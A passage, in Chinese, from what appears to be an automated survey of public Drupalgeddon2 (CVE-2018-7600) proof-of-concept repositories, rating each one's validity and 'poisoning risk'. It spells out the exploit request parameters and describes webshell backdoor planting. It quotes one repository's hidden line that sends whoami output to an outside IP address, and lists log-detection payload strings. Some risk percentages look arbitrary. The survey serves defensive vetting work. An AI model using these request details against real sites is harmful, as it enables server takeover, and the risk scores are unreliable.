1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
